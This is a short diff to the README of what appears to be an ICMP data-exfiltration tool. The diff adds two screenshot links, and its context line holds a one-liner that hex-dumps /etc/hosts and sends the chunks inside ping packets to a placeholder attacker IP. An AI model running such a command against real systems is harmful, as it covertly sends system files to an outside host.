@@ -17,3 +17,6 @@ xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 -p $line <attackers_IP_ad
 ```
 # Screenshots
 
+![command.jpeg](https://github.com/Jokas-null/ICMP-exfiltrator/blob/main/screenshots/command.jpeg)
+
+![etc passwd.jpeg](https://github.com/Jokas-null/ICMP-exfiltrator/blob/main/screenshots/etc%20passwd.jpeg)
